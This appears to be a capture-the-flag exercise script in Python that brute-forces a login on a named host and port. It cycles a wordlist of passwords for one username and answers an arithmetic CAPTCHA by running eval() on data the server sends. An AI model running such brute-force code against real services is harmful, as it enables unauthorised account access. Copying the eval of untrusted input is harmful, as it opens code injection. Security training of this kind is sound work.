"""
	If you know the IP address of v0idcache's server and you
	know the port number of the service you are trying to connect
	to, you can use nc or telnet in your Linux terminal to interface
	with the server. To do so, run:

		$ nc <ip address here> <port here>

	In the above the example, the $-sign represents the shell, nc is the command
	you run to establish a connection with the server using an explicit IP address
	and port number.

	If you have the discovered the IP address and port number, you should discover
	that there is a remote control service behind a certain port. You will know you
	have discovered the correct port if you are greeted with a login prompt when you
	nc to the server.

	In this Python script, we are mimicking the same behavior of nc'ing to the remote
	control service, however we do so in an automated fashion. This is because it is
	beneficial to script the process of attempting multiple login attempts, hoping that
	one of our guesses logs us (the attacker) into the Briong server.

	Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""

from __future__ import print_function
import socket
import sys
import time

host = "wattsamp.net" # IP address here
port = 1337 # Port here
#wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
wordlist = "filtered-ejnorman84.txt" # Point to wordlist file

def recv_all(s):
	text = ""
	while True:
		byte = s.recv(1)
		#print(byte)
		text += byte
		if byte == "\n":
			break
	return text
	
def recv_amount(s, n):
	data = s.recv(n)
	i = len(data)
	#print(data)
	while i < n:
		data += s.recv(n - i)
		#print(data)
		i = len(data)
	return data

def brute_force():
	"""
		Sockets: https://docs.python.org/2/library/socket.html
		How to use the socket s:

			# Establish socket connection
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, port))

			Reading:

				data = s.recv(1024)     # Receives 1024 bytes from IP/Port
				print(data)             # Prints data

			Sending:

				s.send("something to send\n")   # Send a newline \n at the end of your command

		General idea:

			Given that you know a potential username, use a wordlist and iterate
			through each possible password and repeatedly attempt to login to
			v0idcache's server.
	"""
	
	f = open(wordlist, "r")
	username = "ejnorman84"   # Hint: use OSINT
	passwords = f.read().split("\n")
	password = ""
	
	if len(sys.argv) == 1:
		start = 0
	else:
		start = int(sys.argv[1])
	
	response = "Fail"
	
	
	
	for i in range(start, len(passwords)):
		password = passwords[i]
		#if len(password) != 6 or password[0] != "h":
		#    print("Ignored " + str(i))
		#    continue
		
		# Connect
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))
		
		# Skip past intro
		recv_amount(s, len("\n~~~ CAPTCHA ~~~\n"))
		
		# Get next line minimum amount
		result = recv_amount(s, 10) # Gets line, but might be 1 or even 2 longer
		
		# Calculate how much more I need
		extra = 0
		if result[1] != " ":
			extra += 1
		if result[5+extra] != " ":
			extra += 1
		
		# Eval and send info
		# Not safe, but I don't want to build a parser rn.
		answer = eval(result.split("=")[0])
		s.sendall(str(answer) + "\n")
		
		# Throw out Username line and send username
		recv_amount(s, extra + len("\nUsername: "))
		print("\t" + username)
		s.sendall(username + "\n")
	
		# Throw out password line and send password
		result = recv_amount(s, len("Password: "))
		print("\t" + password)
		print("Tested " + str(i))
		s.sendall(str(password) + "\n")
		
		result = s.recv(4)
		print(result)
		if "F" != result[0]:
			print("It is: " + password)
			print(result + recv_all(s))
			break
		s.close()
	
	


if __name__ == '__main__':
	brute_force()
